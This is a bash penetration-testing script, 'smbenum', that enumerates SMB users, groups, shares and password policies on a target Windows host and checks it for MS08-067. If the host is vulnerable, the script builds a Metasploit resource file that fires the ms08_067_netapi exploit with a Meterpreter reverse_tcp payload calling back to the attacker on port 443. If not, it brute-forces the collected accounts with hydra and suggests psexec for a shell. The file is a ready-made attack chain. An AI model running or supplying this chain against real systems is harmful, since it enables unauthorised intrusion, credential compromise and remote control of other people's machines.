#!/bin/bash
# smbenum 0.2 - This script will enumerate SMB using every tool in the arsenal
# SECFORCE - Antonio Quina
# All credits to Bernardo Damele A. G. <bernardo.damele@gmail.com> for the ms08-067_check.py script

IFACE="eth0"

if [ $# -eq 0 ]
	then
		echo "Usage: $0 <IP>"
		echo "eg: $0 10.10.10.10"
		exit
	else
		IP="$1"
fi

echo -e "\n########## Getting Netbios name ##########"
nbtscan -v -h $IP

echo -e "\n########## Checking for NULL sessions ##########"
output=`bash -c "echo 'srvinfo' | rpcclient $IP -U%"`
echo $output

echo -e "\n########## Enumerating domains ##########"
bash -c "echo 'enumdomains' | rpcclient $IP -U%"

echo -e "\n########## Enumerating password and lockout policies ##########"
polenum $IP

echo -e "\n########## Enumerating users ##########"
nmap -Pn -T4 -sS -p139,445 --script=smb-enum-users $IP
bash -c "echo 'enumdomusers' | rpcclient $IP -U%"
bash -c "echo 'enumdomusers' | rpcclient $IP -U%" | cut -d[ -f2 | cut -d] -f1 > /tmp/$IP-users.txt

echo -e "\n########## Enumerating Administrators ##########"
net rpc group members "Administrators" -I $IP -U%

echo -e "\n########## Enumerating Domain Admins ##########"
net rpc group members "Domain Admins" -I $IP -U%

echo -e "\n########## Enumerating groups ##########"
nmap -Pn -T4 -sS -p139,445 --script=smb-enum-groups $IP

echo -e "\n########## Enumerating shares ##########"
nmap -Pn -T4 -sS -p139,445 --script=smb-enum-shares $IP

#echo -e "\n########## Checking for common vulnerabilities ##########"
#nmap -Pn -T4 -sS -p139,445 --script=smb-check-vulns $IP
#nmap -Pn -T4 -sS -p139,445 --script=smb-check-vulns --script-args=unsafe=1 $IP
#echo -e "\nChecking for MS08-067 with metasploit. It could take a while.."
#vulnerable=`msfcli exploits/windows/smb/ms08_067_netapi RHOST=$IP C`
echo -e "\nChecking for MS08-067.."
vulnerable=`python ./scripts/ms08-067_check.py -t $IP -s`
echo $vulnerable

#if [[ $vulnerable == *"The target is vulnerable"* ]]
if [[ $vulnerable == *"VULNERABLE"* ]]
	then
		echo "Oh yeah! The target is vulnerable!"
		MYIP=$(ifconfig $IFACE | awk -F'[: ]+' '/inet addr:/ {print $4}')
		echo "use exploits/windows/smb/ms08_067_netapi" > /tmp/$IP-netapi.rc
		echo "set payload windows/meterpreter/reverse_tcp" >> /tmp/$IP-netapi.rc
		echo "set RHOST $IP" >> /tmp/$IP-netapi.rc
		echo "set LHOST $MYIP" >> /tmp/$IP-netapi.rc
		echo "set LPORT 443" >> /tmp/$IP-netapi.rc
		echo "set ExitOnSession false" >> /tmp/$IP-netapi.rc
		echo "exploit -j" >> /tmp/$IP-netapi.rc

		echo -e "\nTo exploit this host now use:"
		echo -e "msfconsole -r /tmp/$IP-netapi.rc"
	else
		echo "The target is NOT vulnerable!"
		echo -e "\n########## Bruteforcing all users with 'password', blank and username as password"
		hydra -e ns -L /tmp/$IP-users.txt -p password $IP smb -t 1
		rm /tmp/$IP-users.txt

		echo -e "\n\nTo get a shell use:"
		echo -e "/usr/local/bin/psexec.py <user>:<password>@$IP cmd.exe\n"
fi
